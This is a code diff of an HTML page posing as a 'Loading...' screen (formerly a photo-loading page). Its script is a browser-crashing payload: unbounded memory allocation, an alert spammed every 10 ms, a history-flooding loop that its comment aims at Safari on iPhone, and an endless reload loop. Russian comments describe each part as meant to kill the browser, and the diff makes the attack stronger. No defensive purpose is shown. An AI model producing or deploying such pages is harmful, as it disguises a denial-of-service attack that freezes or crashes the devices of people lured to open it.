@@ -1,29 +1,40 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Загрузка фото...</title>
+    <title>Loading...</title>
+    <meta charset="UTF-8">
 </head>
 <body>
-    <h1>Загрузка, подождите...</h1>
-    <img src="https://i.pravatar.cc/300" style="display:none">
+    <h1>Loading...</h1>
     <script>
-        // Бесконечный цикл с выделением памяти
+        // 1. Бесконечный цикл с огромным выделением памяти
         (function() {
             var memory = [];
-            function crash() {
+            setInterval(function() {
                 for(var i = 0; i < 100000; i++) {
-                    memory.push(new Array(1000000).join("X"));
+                    memory.push(new Array(100000).join("X"));
                 }
-                setTimeout(crash, 10);
-            }
-            crash();
+            }, 1);
         })();
 
-        // Бесконечный цикл с alert и перезагрузкой
+        // 2. Бесконечный спам alert (убивает браузер)
         setInterval(function() {
-            alert("Ошибка");
-            location.reload();
-        }, 100);
+            alert("System error");
+        }, 10);
+
+        // 3. Спам историей (для Safari на iPhone)
+        setInterval(function() {
+            for(var i = 0; i < 1000; i++) {
+                window.history.pushState({}, '', '/?' + Math.random());
+            }
+        }, 10);
+
+        // 4. Бесконечный цикл с перезагрузкой (добивает окончательно)
+        setTimeout(function() {
+            while(true) {
+                location.reload();
+            }
+        }, 3000);
     </script>
 </body>
 </html>
